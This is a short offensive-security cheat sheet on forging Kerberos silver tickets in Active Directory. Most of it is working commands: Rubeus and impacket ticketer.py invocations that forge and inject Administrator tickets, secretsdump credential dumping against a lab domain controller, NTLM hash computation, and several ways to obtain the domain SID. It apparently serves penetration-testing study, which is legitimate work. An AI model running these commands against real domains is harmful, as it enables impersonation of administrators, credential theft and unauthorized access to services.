we can forge a service ticket if we have:
- plain-text password or NTLM hash of a service account (secretdump -mimkatz LSASS dump - DCSync)
- Service Principal Name (SPN) of that service
- FQDN
- Domain SID (optional for some tools)

Tools:
1. rubeus
```powershell
rubeus.exe silver /service:MSSQLSvc/lol.local:1433 /rc4:<NTLM> /sid:<DOMAIN_SID> /user:Administrator /domain:<DOMAIN> /ptt
```
2. `tickter.py`
```shell
python3 ticketer.py <TARGET (domain name)> -nthash <NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -dc-ip 10.10.10.1 -spn cifs/test.local -user Administrator

export KRB5CCNAME=./Administrator.ccache

#then confirm that it's there
klist
```



> [!NOTE] NOTE
> this whole tickets forging thing will be useless IF the service did a PAC validation which is rare. Any service that runs inside services.msc will not use PAC validation. 

---

### getting `NTLM` hash or the plain password:

 1. using impacket-secretdump (has to be domain admin account) 
 ```shell
 impacket-secretsdump 'north.sevenkingdoms.local/vagrant:vagrant@192.168.56.11'
```
 
 2.  mimkatz LSASS dump
 3. DCSync attack 
 4. Kerberoast > Crack > NTLM
 ```shell
 # this will get us the NTLM hash
 echo -n 'Password123!' | iconv -f utf-8 -t utf-16le | openssl dgst -md4 
```

---
### Getting Domain SID:
its basically the first part of any SID object.
```powershell
nxc:
nxc ldap lol.local -u sqlsvc -p test -k --get-sid

ldapsearch:
ldapsearch -x -H ldap://<DC_IP> -b "" -s base objectSid

impacket-GetADUsers:
impacket-GetADUsers domain/user:password@<DC_IP> -all

rpcclient:
rpcclient $> lookupdomain north.sevenkingdoms.local
```